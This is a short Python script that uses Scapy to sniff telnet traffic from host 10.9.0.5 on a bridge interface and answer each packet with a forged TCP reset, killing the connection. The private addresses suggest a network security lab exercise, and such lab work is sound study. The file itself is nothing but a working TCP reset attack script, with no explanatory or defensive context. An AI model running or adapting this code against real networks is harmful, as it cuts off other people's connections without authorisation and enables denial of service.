from scapy.all import *

def TcpRst(pkt):
    ip = IP(src=pkt[IP].dst, dst="10.9.0.5")  
    tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="R", seq=pkt[TCP].ack)
    pkt = ip/tcp
    ls(pkt)
    send(pkt, verbose=0)

sniff(iface="br-f9c61e9fd30f", filter="tcp and src host 10.9.0.5 and dst port 23", prn=TcpRst, store=0)
